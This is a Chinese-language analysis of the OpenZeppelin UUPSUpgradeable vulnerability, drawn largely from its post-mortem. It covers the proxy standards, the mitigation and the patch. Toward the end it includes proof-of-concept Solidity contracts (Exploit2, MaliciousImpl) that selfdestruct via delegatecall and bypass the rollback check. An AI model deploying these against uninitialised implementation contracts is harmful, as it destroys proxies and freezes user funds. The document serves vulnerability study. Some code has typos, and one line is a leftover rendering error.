# UUPSUpgradeable 漏洞分析
## 实现对比
### EIP-1967
在 UUPS 中，EIP-1967 的目的是规定一个通用的存储插槽，用于在代理合约中的特定位置存放实现逻辑合约的地址。其规定了如下特定的插槽：

	=> 实现逻辑合约地址
	bytes32(uint256(keccak256("eip1967.proxy.implementation") - 1))
	更新该地址时，需要同时发出：
	event Upgraded(address indexed implementation);
	
	=> beacon地址
	bytes32(uint256(keccak256("eip1967.proxy.beacon") - 1))
	更新该地址时，需要发出：
	event BeaconUpgraded(address indexed beacon);
	
	=> admin 地址
	bytes32(uint256(keccak256("eip1967.proxy.admin") - 1))
	更新该地址时，需要发出：
	event AdminChanged(address indexed previousAdmin, address newAdmin);
EIP-1967 在设计如上插槽的时，特意将计算得到的地址减去1，目的是为减少函数签名攻击机会。

	函数签名攻击的思路是：由于solidity中识别一个函数，靠的是函数签名，而函数签名是函数哈希后的前4个bytes，是非常容易碰撞出来的。在一个独立的solidity文件中，编译器自己会去检查所有的external和public函数是否存在函数签名碰撞，而对于代理模式的合约文件，可能存在proxy合约中的函数签名与impl合约中的函数签名碰撞。而一旦发生这种碰撞，proxy合约中的函数就会被直接调用，而不是impl合约对应的函数。

比如 EIP-897 中，其规定了如下两个函数：

	interface ERCProxy {
	  function proxyType() public pure returns (uint256 proxyTypeId);
	  function implementation() public view returns (address codeAddr);
	}
作为一个实现 EIP-897 的代理合约，其在代理合约中会实现这两个函数。

### UUPS EIP-1822 
EIP-1822 讨论的合约升级模式与 Openzeppelin 的透明合约升级模式的不同点在于：

-  EIP-1822 的代理合约只读取实现合约的地址，并将所有的方法都代理给实现合约，包括修改实现合约地址的实现逻辑部分也在实现合约里。
-  而透明合约升级模式中，代理合约管理着实现逻辑合约的地址，要实现逻辑合约升级，只需要在代理合约中更改实现逻辑合约的地址即可。其他的实现逻辑代理由实现逻辑合约。

也就是说 EIP-1822 的实现逻辑合约既包含了

- 普通的业务实现逻辑处理
- 更包含了自身的升级实现逻辑处理。

简单来讲就是 EIP-1822 的实现逻辑合约部分，都需要继承自一个公共的可升级实现逻辑合约：`proxiable.sol`。在可升级的实现逻辑合约 `proxiable` 中，实现如下方法：

	function proxiableUUID() public pure returns (bytes32) {
		//作用是一个flag，用来判断是否返回特定值keccak256("PROXIABLE")，以判断该合约是否是一个实现了EIP-1822的可升级实现合约
	}
	function updateCodeAddress(address newAddress) ineternal {
		//简单来讲就是更新实际实现逻辑合约的地址
		require(this.proxiableUUID() == Proxiable(newAddress).proxiableUUID());
		bytes32 proxiableUUID_ = this.proxiableUUID();
		assembly{
		 sstore(proxiableUUID_, newAddress)
		}
	}
然后在实现逻辑合约中，所有的实现逻辑合约都继承自 proxiable 合约，然后实现自己的实现逻辑即可。因为代理合约只是从插槽 `keccak256("PROXIABLE")` 处读取实现逻辑合约的地址，而实现逻辑合约可以通过 proxiable 中的 `updateCodeAddress` 方法来更新这个地址，从而实现代理合约中对应插槽`keccak256("PROXIABLE")` 位置处的地址改变为目标地址。

### Openzeppelin 透明代理合约
#### 透明代理合约方案
OpenZeppelin Contracts 包括几个[代理合约](https://docs.openzeppelin.com/contracts/4.x/api/proxy)用于启用可升级性。

所有这些都基于相同的概念：

每个可升级的部署都由
	
- 一个包含要执行的代码的实现合约(实现逻辑合约)
- 一个包含状态的代理合约组成(数据+代理合约)

每当用户调用代理合约时，代理都会将执行委托给实现合约。为了升级合约，代理指向不同的实现合约，从而改变正在执行的代码但保留相同的地址和状态。您可以在[此处](https://blog.openzeppelin.com/the-state-of-smart-contract-upgrades/#upgrade-patterns)阅读有关此模式如何工作的更多信息 

库中最流行的两种模式是透明代理和 UUPS 代理。如[此处](https://docs.openzeppelin.com/contracts/4.x/api/proxy#transparent-vs-uups)所述，它们之间的主要区别在于升级实现逻辑所在的位置。

- 在透明代理中，升级实现逻辑在代理中。
- 在 UUPS 模式中，代理将所有调用委托给实现逻辑合约，它处理业务实现逻辑和升级实现逻辑。这允许用户决定用于升级的授权实现逻辑，例如 [Ownable](https://docs.openzeppelin.com/contracts/4.x/api/access#Ownable) 或 [访问控制](https://docs.openzeppelin.com/contracts/4.x/api/access#AccessControl) ，或任何其他自定义解决方案。

为此，该库提供了一个基本的 [UUPSUpgradeable](https://docs.openzeppelin.com/contracts/4.x/api/proxy#UUPSUpgradeable) 实施合同应延伸的合同。

UUPSUpgradeable 中的内部升级实现逻辑执行多项任务。除了更改存储在代理中的实现逻辑合约外，它还执行 `DELEGATECALL` 新实现以原子地执行任何迁移功能，作为 [upgradeToAndCall](https://docs.openzeppelin.com/contracts/4.x/api/proxy#UUPSUpgradeable) 行动。

在此之后，合约执行回滚测试。为了确保新的实现合约具有有效的升级实现逻辑，它会执行另一个 `DELEGATECALL` 以升级回当前版本。

- 如果成功，合约最终会重新升级到新的实现。这可以防止意外升级到没有升级实现逻辑的合约，这会冻结该版本中的代理。

此升级操作的代码如下，在 [ERC1967Upgrade](https://docs.openzeppelin.com/contracts/4.x/api/proxy#ERC1967Upgrade) 中实现基础合同。

	function _upgradeToAndCallSecure(address newImplementation, bytes memory data, bool forceCall) internal {
	  address oldImplementation = _getImplementation();
	
	  // Initial upgrade and setup call
	  _setImplementation(newImplementation);
	  if (data.length > 0 || forceCall) {
	    Address.functionDelegateCall(newImplementation, data);
	  }
	
	  // Perform rollback test if not already in progress
	  StorageSlot.BooleanSlot storage rollbackTesting = StorageSlot.getBooleanSlot(_ROLLBACK_SLOT);
	
	  if (!rollbackTesting.value) {
	    // Trigger rollback using upgradeTo from the new implementation
	    rollbackTesting.value = true;
	    Address.functionDelegateCall(
	      newImplementation,
	      abi.encodeWithSignature("upgradeTo(address)", oldImplementation)
	    );
	
	    rollbackTesting.value = false;
	
	    // Check rollback was effective
	    require(oldImplementation == _getImplementation(), "ERC1967Upgrade: upgrade breaks further upgrades");
	
	    // Finally reset to the new implementation and log the upgrade
	    _upgradeTo(newImplementation);
	  }
	}
UUPSUpgradeable 合同扩展了 [ERC1967Upgrade](https://docs.openzeppelin.com/contracts/4.x/api/proxy#ERC1967Upgrade)，通过在可自定义的访问控制检查后面公开此升级内部方法。

#### 漏洞
该漏洞存在于升级函数中的 `DELEGATECALL` 指令中，由 UUPSUpgradeable 基础合约暴露。如[此处](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#potentially-unsafe-operations)所述, 一个 `DELEGATECALL` 可以被攻击者利用，方法是让实现合约调用另一个合约 `SELFDESTRUCT` 本身，导致调用者被破坏。

给定一个 UUPS 实现合约，攻击者可以[初始化它](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#initializers) 并指定自己为升级管理员。这允许他们调用 [upgradeToAndCall](https://docs.openzeppelin.com/contracts/4.x/api/proxy#UUPSUpgradeable-upgradeToAndCall-address-bytes-) 直接在实现上运行，而不是在代理上运行，并将其用于 `DELEGATECALL` 带有 `SELFDESTRUCT` 操作的恶意合约。

如果攻击成功，任何受此实现支持的代理合约都将变得不可用，因为对它们的任何调用都被委托给一个没有可执行代码的地址。此外，由于升级逻辑驻留在实现中而不是代理中，因此不可能将代理升级为有效的实现。这有效地破坏了合约，并阻碍了对其持有的任何资产的访问。
#### 缓解措施
此漏洞的缓解措施很简单：

初始化实现合约。如果实现被初始化，攻击者就不能再通过调用 upgradeToAndCall 它的授权检查。我们在 9 月 9 日作为公共安全顾问披露修复和漏洞之前分享了这个[方案](https://forum.openzeppelin.com/t/security-advisory-initialize-uups-implementation-contracts/15301)，以尽量减少其影响。

在分享建议之前，我们发送了交易以初始化跨以太坊主网、Polygon、xDAI、Binance 和 Avalanche 的 150 多个未初始化的 UUPS 实施合约。我们没有在 Fuse、Fantom、Arbitrum 或 Optimism 上找到任何实例。这些交易都是从 EOA 发送的0x37E8d216c3f6c79eC695FBD0cB9842e62fB84370，并通过批处理合约发送 0x310fAC62C976d8F6FDFA34332a56EA1a05493b5b。我们使用 [Taichi](https://taichi.network/) 私下在主网上转发了交易以防止普遍的抢先机器人。

为了识别 UUPS 实例，我们搜索 Upgraded 了所有链上的事件，这些事件是在创建代理时发出的。然后我们使用 [ERC1967](https://eips.ethereum.org/EIPS/eip-1967) 过滤代理实施数据并且没有管理员，从混合中删除透明代理。然后我们在获得的实现的字节码中搜索操作码的出现`DELEGATECALL` ，并继续分析它们。此外，我们在 Etherscan 上的已验证合约中搜索了该 `UUPSUpgradeable` 字符串，以防我们在之前的搜索中遗漏了任何内容。

为了识别 `initialize` 函数，它可以根据接收到的参数在实现之间有所不同，我们提取了在为实现部署代理时使用的调用数据。这在大多数情况下都有效，但对于其他情况，我们除了手动重建初始化调用外别无他法。

为避免在初始化合约时意外授予对不安全地址的访问权限，我们将初始化调用数据中的任何类似地址的内容替换为虚拟合约。该合约实现了我们审查的初始化程序所需的几种方法，例如名称、符号、小数、token0、token1、工厂等。

此外，在执行初始化之后，我们 selfdestruct 编辑了批处理合约，因为几个初始化器授予 `msg.sender ` 管理员权限。这确保了没有地址可以控制我们初始化的任何实现。
#### 修补程序
合同 4.3.2 和库的升级安全版本中提供了一个修补程序。该修复 `onlyProxy` 为 UUPSUpgradeable 基础合约添加了一个修饰符，以防止直接在实现上调用升级函数。

	address private immutable __self = address(this);
	
	modifier onlyProxy() {
	  require(address(this) != __self, "Function must be called through delegatecall");
	  require(_getImplementation() == __self, "Function must be called through active proxy");
	  _;
	}
我们还更新了文档和指南，建议在部署时初始化所有实现逻辑合同。此外，我们修改了[向导生成的代码](https://wizard.openzeppelin.com/) 包括一个在部署时自动初始化实现的构造函数。
#### 下一步
我们的团队将为库的下一个版本彻底审查回滚测试机制。虽然代码提供了可靠的保证，防止意外破坏合约，但它也需要使用潜在的危险 `DELEGATECALL` 操作。我们将评估删除此检查以支持更简单的检查，并在[工具方面添加更多保护措施](https://docs.openzeppelin.com/upgrades-plugins/1.x/) .

在流程方面，我们计划增加合同中所有主要功能所需审查的数量，特别是当它涉及需要违反安全建议的代码更改时，就像这里的情况一样。

最后但同样重要的是，我们正在努力建立主动监控基础设施，以便在部署易受攻击的未初始化实施合同时发出警报。我们将很快分享更多关于此的消息。

#### 为什么不使用 EIP-1822
Openzeppelin 中关于 EIP-1822 的实现与 EIP-1822 协议中的定义并不一致，主要是 EIP-1822 中定义的插槽位置与 EIP-1967 中定义的插槽位置不一致导致。openzeppelin 选择使用 EIP-1967 中定义的插槽位置来具体实现。因为 EIP-1822 也有很明显的缺点:

	即新来的一个实现逻辑合约中只实现了 proxiableUUID 方法，没有实现 updateCodeAddress 方法，则合约就无法继续升级，导致所有的代理合约都锁死。
故 openzepplin 在具体实现时，其实现的具体思路为：

	提供一个 `UUPSUpgradeable` 合约，在该合约中提供合约升级方法 `upgradeTo`. 
与 EIP-1822 的不同点在于，它取消了 `proxiableUUID` 这个 flag，增加了`_autorizeUpgrade` 方法，用于授权一个新地址。同时提供了一个 `upgradeToAndCall` 方法，用于升级后马上进行初始化操作。

	function upgradeTo(address newImplementation) external virtual {
	    //第一步检查 msg.sender 的权限
	    _authorizeUpgrade(newInplementation);
	    
	    //第二步执行升级步骤
	    _upgradeToAndCallSecure(newImplementaion,new bytes(0),false);
	}
	
	function upgradeToAndCall(address newImplementation, bytes memory data) external payable virtual {}
	function _authorizeUpgrade(address newImplementation) internal onlyOwner() {}
openzeppelin 通过回滚检测，来检查是否升级成功，避免了EIP-1822中遇到的问题

	function _upgradeToAndCallSecure(address newImplementation,bytes memory data,bool forceCall) internal {
	    //第一步：设置新实现逻辑合约地址到旧实现逻辑合约地址
	    address oldImplementation = _getImplementation();
	    _setImplementation(newImplementation);
	    
	    //第二步：针对新的新合约地址进行初始化
	    if (data.length > 0 || forceCall) {
	        Address.delegateCall(newImplementation, data);
	    }
	    
	    //第三步：执行回滚检查
	    // Perform rollback test if not already in progress
	    StorageSlot.BooleanSlot storage rollbackTesting = StorageSlot.getBooleanSlot(_ROLLBACK_SLOT);
	    
	    //第四步：首先假设触发回滚操作，由新地址重新回滚到旧地址上，再检查升级后的旧地址是否是之前的旧地址，如果是，则说明回滚成功。如果可以回滚成功，说明升级到该新地址是安全的。
	    if (!rollbackTesting.value) {
	        //需要执行回滚操作
	        //即将新实现逻辑合约地址由新地址改回旧地址，通过调用新地址上的 upgradeTo 方法来进行
	        rollbackTesting.value = true;
	        Address.functionDelegateCall(newInplementation, abi.encodeWithSigature("upgradeTo(address)",oldImplementation));
	        rollbackTesting.value = false;
	  
	        //检查回滚是否成功
	        require(oldImplementation == _getImplementation());
	     
	        //最后设置回新地址，并打 log Upgraded(address)
	        _upgradeTo(newImplementation);
	    }
	}

- Openzepplin的实现漏洞分析

	在上述的 Openzeppelin 的实现中，其通过回滚检测避免了 EIP-1822 中遇到的问题：
	
		即升级到一个不满足 EIP-1822 规范的合约时，此时代理合约和实现合约就完全被锁死，无法继续升级。
	但是其又引入了一个新的问题，
	
		即回滚操作中事实上模拟了一遍新的实现合约地址中的 upgradeTo 操作，并且是通过 delegatecall 方式来进行调用。
	通过 `delegatecall` 调用新合约地址的 upgradeTo 方法有什么问题呢？查看黄皮书中关于 `delegatecall` 的定义为：

		Message-call into this account with an alternative accounts' code, but persisting the current values for sender and value
		KaTeX parse error: Can't use function '$' in math mode at position 1: $̲(\boldsymbol{\s…
		this means that the receipient is in fact the same account as at persent, simply that the code is overwritten and the context is almost entirely identical
	从黄皮书的定义来看，`delegatecall` 事实上保存了当前账户的余额和 `msg.sender` ,  只是调用远程合约的代码，让远程合约的代码跑在当前账户的上下文环境上。

	利用 openzeppelin 的[在线代码生成](https://docs.openzeppelin.com/contracts/4.x/wizard)，可以生成如下的代码：
	
		// SPDX-License-Identifier: MIT
		pragma solidity ^0.8.2;
		
		import "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
		import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
		import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
		import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
		
		contract TestToken is Initializable, ERC20Upgradeable, OwnableUpgradeable, UUPSUpgradeable {
		    /// @custom:oz-upgrades-unsafe-allow constructor
		    // constructor() initializer {}
		   //这里不应该出现 constructor 的初始化，但是 initializer 事实上只是进行了一个判断，即该函数的调用过程是否在初始化过程中 involve 了，它并没有进行状态的改变。
		
		    function initialize() initializer public {
		        __ERC20_init("testToken", "MTK");
		        __Ownable_init();
		        __UUPSUpgradeable_init();
		    }
		
		    function mint(address to, uint256 amount) public onlyOwner {
		        _mint(to, amount);
		    }
		
		    function _authorizeUpgrade(address newImplementation)
		        internal
		        onlyOwner
		        override
		    {}
		}
	注意这里的 TestToken 是 UUPS 升级合约的实现逻辑合约部分，而不是代理合约部分。那么应该如何去做这个 TestToken 的 POC 呢？
- POC

	这里不能直接在 malicious 合约中的 `upgradeTo` 方法中写 `selfdestruct`，而是应该利用 `ForceCall` 部分的 `delegatecall`，并通过写入 `rollbackTesting.value = true` 来绕过回滚检查，当这一笔交易执行结束后，合约 `TestToken` 的代码被完全清空。

		pragma solidity ^0.8.0;
		
		import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
		
		contract Exploit2 {
		    
		    function hack() public {
		         bytes32  _ROLLBACK_SLOT = 0x4910fdfa16fed3260ed0e7147f7cc6da11a60208b5b9406d12a635614ffd9143;
		         StorageSlotUpgradeable.BooleanSlot storage rollbackTesting = StorageSlotUpgradeable.getBooleanSlot(_ROLLBACK_SLOT);
		         
		         //避免回滚测试
		         rollbackTesting.value = true;
		         selfdestruct(payable(tx.origin));
		         
		    }
		    function _authorizeUpgrade(address newImplementation) internal  {
		        
		    }
		}
- 回滚问题

	那么在 openzeppelin 的 UUPS 实现中，使用 `delegatecall` 来进行回滚测试有什么问题呢？

	- 问题就是：	
	
			Address.functionDelegateCall(newInplementation, abi.encodeWithSigature("upgradeTo(address)",oldImplementation));
		上述代码将 `newInplementation` 地址上的 `upgradeTo` 方法代码放到当前地址来执行，如果在 `upgradeTo` 方法中，放入 `selfdestruct` 这一个 `opcode`，让合约自毁，则当前合约地址就会自毁，根本不会继续执行后面的 `require`语句：
	
			require(oldImplementation == _getImplementation());
		实现逻辑为：

			pragma solidity 0.8.0;
			contract MaliciousImpl{
				function upgradeTo(address newImplementation) external  {
					selfdestruct(address(0));
				}
			}
		上述 openzeppelin 实现的代码中，最为核心的一条是理解：
		
			当 delegatecall 到一个 selfdestruct 方法后，程序所有的代码都会被直接清空，不会继续往下执行，也就不会去执行后面的 require 判断条件。
		然而在 remix 中执行时，发现 delegatecall 之后的 require 语句还是执行了,这是不对的，需要进一步理解黄皮书中关于 `selfdestruct` 这个 `opcode` 的定义：
		
			selfdestruct: Halt execution and register account for later deletion
		
			function _functionDelegateCall(address target, bytes memory data) private returns (bytes memory) {
			    require(AddressUpgradeable.isContract(target), "Address: delegate call to non-contract");
			
			    // solhint-disable-next-line avoid-low-level-calls
			    (bool success, bytes memory returndata) = target.delegatecall(data);
			    return AddressUpgradeable.verifyCallResult(success, returndata, "Address: low-level delegate call failed");
			}
		- 当 `delegatecall` 到一个 selfdestruct 的方法时，其返回值为0，然后代码继续运行。
			- 如果此笔交易在后续的执行过程中成功，则上下文地址上的代码将会被清空。
			- 如果该笔交易在后续的执行过程中失败，则整体状态会回滚。	
		
## 参考
[uupsupgradeable-vulnerability-post-mortem](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680)

	
